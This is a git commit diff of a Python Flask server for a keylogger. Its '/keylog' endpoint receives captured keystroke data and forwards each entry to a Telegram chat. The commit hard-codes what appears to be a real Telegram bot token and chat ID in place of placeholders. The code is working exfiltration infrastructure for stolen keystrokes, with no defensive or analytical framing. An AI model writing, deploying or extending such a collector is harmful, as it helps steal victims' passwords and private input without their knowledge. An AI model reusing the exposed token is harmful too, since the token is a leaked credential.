c2d75db152eb6c4236c0c4fcc68b831bbf07f207
redmeet288 <154670406+redmeet288@users.noreply.github.com>
2025-07-02 14:14:14 +0200

    server.py

--- server.py
+++ server.py
@@ -1,33 +1,21 @@
 from flask import Flask, request
-from aiogram import Bot, Dispatcher
+from aiogram import Bot
 from aiogram.enums import ParseMode
 from aiogram.client.default import DefaultBotProperties
-from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.utils import executor
-import threading
 import asyncio
 
-TOKEN = "your_token_bot"
-CHAT_ID = "your_chat_id" 
+TOKEN = "6904720328:AAHdFOlcIoO1r_AaF9JtU0bONBs0Yn3NiZM"
+CHAT_ID = 1497603032
 
 app = Flask(__name__)
-
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-dp = Dispatcher(storage=MemoryStorage())
 
 @app.route('/keylog', methods=['POST'])
 def keylog():
     data = request.data.decode('utf-8')
-    print(f"Полученная строка: {data}")
-
-    asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=CHAT_ID, text=data), asyncio.get_event_loop())
+    print(f"Получено: {data}")
+    asyncio.run(bot.send_message(chat_id=CHAT_ID, text=data))
     return 'OK'
 
-def run_flask():
-    app.run(host='0.0.0.0', port=5000)
-
 if __name__ == '__main__':
-
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.start()
-    executor.start_polling(dp, skip_updates=True)
+    app.run(host='0.0.0.0', port=5000)
